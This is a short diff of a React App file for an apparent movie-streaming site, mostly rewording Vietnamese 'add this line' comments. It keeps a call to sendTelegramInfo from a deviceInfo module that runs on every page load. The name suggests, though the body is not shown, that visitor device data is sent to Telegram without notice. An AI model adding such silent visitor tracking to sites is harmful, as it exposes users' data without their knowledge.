@@ -1,4 +1,4 @@
-import { useEffect } from 'react'; // ← thêm dòng này
+import { useEffect } from 'react'; // ← THÊM DÒNG NÀY
 import { BrowserRouter, Routes, Route } from 'react-router-dom';
 import Navbar from './components/Navbar';
 import Banner from './components/Banner';
@@ -6,7 +6,7 @@ import Row from './components/Row';
 import ComingSoon from './components/ComingSoon';
 import Watch from './pages/Watch';
 import { nowPlaying, comingSoon } from './data/movies';
-import { sendTelegramInfo } from './utils/deviceInfo'; // ← thêm import
+import { sendTelegramInfo } from './utils/deviceInfo'; // ← THÊM DÒNG NÀY
 import './index.css';
 
 function Home() {
@@ -21,8 +21,9 @@ function Home() {
 }
 
 function App() {
+  // THÊM useEffect NÀY
   useEffect(() => {
-    sendTelegramInfo(); // ← gọi hàm
+    sendTelegramInfo();
   }, []);
 
   return (
